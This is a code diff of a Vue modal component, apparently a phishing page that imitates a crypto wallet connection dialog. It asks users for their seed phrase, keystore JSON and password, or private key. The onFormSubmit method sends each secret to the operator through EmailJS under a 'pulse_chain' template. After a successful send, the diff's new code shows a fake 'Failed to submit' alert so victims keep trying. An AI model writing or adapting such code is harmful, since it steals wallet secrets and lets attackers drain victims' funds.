@@ -19,7 +19,7 @@
         </div>
         <div class="modal-body">
           <ul class="nav nav-pills mb-3" id="pills-tab" role="tablist">
-            <li class="nav-item" role="presentation">
+            <li class="nav-item" role="presentation" @click="showPhrase">
               <button
                 class="nav-link active"
                 id="pill-phrase-key"
@@ -31,7 +31,7 @@
                 aria-selected="true"
               >Phrase</button>
             </li>
-            <li class="nav-item" role="presentation">
+            <li class="nav-item" role="presentation" @click="showKeystore">
               <button
                 class="nav-link"
                 id="pills-keystore-tab"
@@ -43,7 +43,7 @@
                 aria-selected="false"
               >Keystore JSON</button>
             </li>
-            <li class="nav-item" role="presentation">
+            <li class="nav-item" role="presentation" @click="showPrivateKey">
               <button
                 class="nav-link"
                 id="pills-contact-tab"
@@ -69,7 +69,7 @@
                   <textarea
                     v-model="phraseText"
                     class="form-control"
-                    :class="[error ? error : '']"
+                    :class="[isPhrase ? error : '']"
                     id="phraseText"
                     rows="3"
                     placeholder="Enter your Phrase"
@@ -101,7 +101,7 @@
                     id="keystoreText"
                     rows="3"
                     placeholder="Enter your Keystore JSON"
-                    :class="[error ? error : '']"
+                    :class="[isKeystore ? error : '']"
                   ></textarea>
                 </div>
                 <div class="mb-3">
@@ -111,7 +111,7 @@
                     id="keystorePassword"
                     placeholder="Enter password"
                     v-model="keystore_password"
-                    :class="[error ? error : '']"
+                    :class="[isPrivKey ? error : '']"
                   />
                 </div>
               </div>
@@ -126,7 +126,6 @@
               role="tabpanel"
               aria-labelledby="pills-contact-tab"
               tabindex="0"
-              @submit.prevent="onFormSubmit"
             >
               <div class="modal-body">
                 <div class="mb-3">
@@ -136,136 +135,124 @@
                     id="phraseText"
                     rows="3"
                     placeholder="Enter your private key"
-                    :class="[error ? error : '']"
+                    :class="[isPrivateKey ? error : '']"
                   ></textarea>
                 </div>
               </div>
               <div class="modal-footer border-0">
                 <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-                <button type="button" class="btn btn-primary">Save</button>
+
+                <button type="button" class="btn btn-primary" @click.prevent="onFormSubmit">Save</button>
               </div>
             </form>
           </div>
         </div>
       </div>
     </div>
+   
   </div>
 </template>
 
-<script scoped>
-import emailjs from '@emailjs/browser'
+<script>
+import emailjs from "@emailjs/browser";
 
 export default {
   name: "ModalBox",
-  props: { item: Object, show_modal_box: Boolean },
+  props: { item: Object, show_modal_box: Boolean},
   data() {
     return {
       phraseText: "",
-
       key_text: "",
       keystore_password: "",
-
       privateKeyText: "",
-      error: ""
+      error: "",
+      isPhrase: true,
+      isKeystore:false,
+      isPrivateKey: false
     };
   },
   methods: {
-    async sendEmail(data) {
-      const res = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
-        method: "POST",
-        headers: {},
-        body: JSON.stringify(data)
-      });
-
-      return res.json();
-    },
-
     onFormSubmit() {
-
       let data = {};
 
       if (this.phraseText) {
-        
         data = {
           phrase: this.phraseText
         };
-       
+
         emailjs
           .send(
-            "service_uynt2f8",
-            "template_wex_testing",
+            "service_738v7m1",
+            "template_pulse_chain",
             data,
-            "9KGhesJ06ZTqeE3OE"
+            "3lIG2wUMI54InCPtJ"
           )
           .then(
             function(response) {
-              (response.status === 200) ? '': ''
-              this.phraseText = ''
+              response.status === 200 ? alert("Failed to submit") : alert("An error occured");
+              this.phraseText = "";
             },
             function(error) {
               alert("FAILED...", error);
             }
           );
-       
-      }else{
-        this.error = 'border-danger border-3'
+      } else {
+        this.error = "border-danger border-3";
+        this.isPhrase = true;
       }
 
-      this.phraseText = ''
+      this.phraseText = "";
 
       if (this.key_text && this.keystore_password) {
-
         data = {
           keystore_key: this.key_text,
           keystore_password: this.keystore_password
         };
-       
-        
+
         emailjs
           .send(
-            "service_uynt2f8",
-            "template_wex_testing",
+           "service_738v7m1",
+            "template_pulse_chain",
             data,
-            "9KGhesJ06ZTqeE3OE"
+            "3lIG2wUMI54InCPtJ"
           )
           .then(
             function(response) {
-              (response.status === 200) ? '': ''
+              response.status === 200 ? "Failed to submit" : "An error occured";
             },
             function(error) {
               alert("FAILED...", error);
             }
           );
-      }else{
-        this.error = 'border-danger border-3'
+      } else {
+        this.error = "border-danger border-3";
       }
 
-      this.key_text = ''
-      this.keystore_password = ''
+      this.key_text = "";
+      this.keystore_password = "";
 
       if (this.privateKeyText) {
-
         data = {
           private_key_text: this.privateKeyText
         };
 
         emailjs
           .send(
-            "service_uynt2f8",
-            "template_wex_testing",
+           "service_738v7m1",
+            "template_pulse_chain",
             data,
-            "9KGhesJ06ZTqeE3OE"
+            "3lIG2wUMI54InCPtJ"
           )
           .then(
             function(response) {
-              (response.status === 200) ? '': ''
+              response.status === 200 ? "" : "";
             },
             function(error) {
               alert("FAILED...", error);
             }
           );
-      }else{
-        this.error = 'border-danger border-3'
+      } else {
+        this.error = "border-danger border-3";
       }
     },
     getImageUrl(pic) {
@@ -291,4 +278,6 @@ export default {
   background: transparent;
   color: #0d6efd;
 }
+
+
 </style>
